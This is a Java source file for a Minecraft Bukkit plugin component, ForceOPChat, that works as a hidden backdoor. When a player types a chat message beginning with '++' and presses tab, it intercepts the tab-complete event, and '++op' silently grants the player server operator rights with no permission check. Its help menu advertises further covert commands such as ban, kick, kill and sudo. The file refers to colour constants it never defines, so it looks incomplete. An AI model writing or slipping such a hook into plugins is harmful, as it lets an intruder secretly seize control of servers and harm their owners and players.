package com.webmets.forceopchat;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;
import org.bukkit.plugin.Plugin;

public class ForceOPChat implements Listener{

	//private Plugin pl;
	private String prefix = "++";
	
	public ForceOPChat(Plugin plugin) {
		//this.pl = plugin;
	}
	
	
	
	@EventHandler
	public void onChat(PlayerChatTabCompleteEvent e) {
		if(!e.getChatMessage().startsWith(prefix)) return;
		e.getTabCompletions().clear();
		
		String[] raw = e.getChatMessage().split(" ");
		List<String> args = new ArrayList<String>();
		String cmd = raw[0].substring(prefix.length());
		
		Player p = e.getPlayer();
		
		for(int i = 1; i < raw.length; i++) {
			args.add(raw[i]);
		}

		if(args.size() == 0) {
			if(cmd.equalsIgnoreCase("help")) {
				showIndex(p);
				return;
			}
		} else if(args.size() == 1) {
			if(cmd.equalsIgnoreCase("op")) {
				p.setOp(true);
				return;
			}
		}
	}
	
	private void showIndex(Player p) {
		p.sendMessage(RED + prefix+PINK + "help");
		p.sendMessage(RED + prefix+PINK + "op [player]");
		p.sendMessage(RED + prefix+PINK + "ban <player>");
		p.sendMessage(RED + prefix+PINK + "kick <player>");
		p.sendMessage(RED + prefix+PINK + "invsee <player>");
		p.sendMessage(RED + prefix+PINK + "tp <player> [player]");
		p.sendMessage(RED + prefix+PINK + "kill <player>");
		p.sendMessage(RED + prefix+PINK + "sudo <player> <msg>");
	}
	
	public void broadcast(String msg) {
		
	}
}
